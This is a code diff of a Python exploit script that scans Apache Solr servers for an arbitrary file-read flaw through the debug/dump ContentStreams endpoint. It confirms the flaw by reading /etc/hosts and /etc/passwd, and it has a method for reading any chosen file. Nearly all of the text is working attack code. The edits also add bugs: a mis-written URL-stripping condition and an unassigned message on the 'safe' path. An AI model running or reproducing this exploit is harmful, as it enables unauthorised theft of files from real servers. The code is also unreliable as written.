@@ -33,49 +33,44 @@ class EXP:
         print(msg)
 
     def parseArgs(self):
-        # date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
         parser = ArgumentParser()
         parser.add_argument("-u", "--url", required=True, type=str, help=f"The target address, (ip:port) or url")
         parser.add_argument("-t", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
-        # parser.add_argument("-o", "--output", required=False, type=str, default=f"./{date}.txt",  help=f"Vuln url output file, default is ./{date}.txt")
         return parser.parse_args()
 
     # 验证漏洞
     def verify(self):
+        self.url = self.args.url
+        self.url = self.url.replace("http://", "") if "https://" in self.url else self.url
+        self.url = self.url.replace("https://", "") if "https://" in self.url else self.url
+        self.url = f"http://{self.url}"
+        reqURL = self.url + "/solr/"
         try:
-            self.url = self.args.url.replace("http://", "")
-        except:
-            try:
-                self.url = self.args.url.replace("https://", "")
-            except:
-                pass
-        try:
-            reqURL = "http://" + self.url + "/solr/"
             requests.get(url=reqURL, timeout=self.args.timeout)
         except:
-            print(f"[-] {self.url} cannot be connected\n")
+            print(f"\033[31m[!] [ Conn ]  {reqURL}\033[0m")
             return
         try:
-            reqURL = "http://" + self.url + "/solr/admin/cores?indexInfo=false&wt=json"
-            rep = requests.get(url=reqURL, timeout=self.args.timeout)
+            reqURL = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
+            rep = requests.get(url=reqURL, timeout=self.args.timeout, verify=False)
             self.name = list(json.loads(rep.text)["status"])[0]
         except:
-            print(f"[-] {self.url} is safe\n")
+            print(f"[-] [ Safe ]  {self.url}")
             return
         if "127.0.0.1" in self.checkVuln("/etc/hosts"):
-            msg = f"\033[32m[+] {self.url} Exist Vulnerability !\033[0m\n"
+            msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
             self.hasVuln = True
         else:
             if "root" in self.checkVuln("/etc/passwd"):
-                msg = f"\033[32m[+] {self.url} Exist Vulnerability !\033[0m\n"
+                msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
                 self.hasVuln = True
             else:
-                msg = f"[-] {self.url} is safe\n"
+                f"[-] [ Safe ]  {self.url}"
         print(msg)
 
     # 利用漏洞读取文件检验漏洞存在与否
     def checkVuln(self, filename):
-        reqURL = "http://" + self.url + "/solr/" + self.name + "/debug/dump?param=ContentStreams&wt=json"
+        reqURL = self.url + "/solr/" + self.name + "/debug/dump?param=ContentStreams&wt=json"
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded'
         }
@@ -90,7 +85,7 @@ class EXP:
 
     # 利用漏洞读取文件
     def readFile(self, filename):
-        reqURL = "http://" + self.url + "/solr/" + self.name + "/debug/dump?param=ContentStreams&wt=json"
+        reqURL = self.url + "/solr/" + self.name + "/debug/dump?param=ContentStreams&wt=json"
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded'
         }
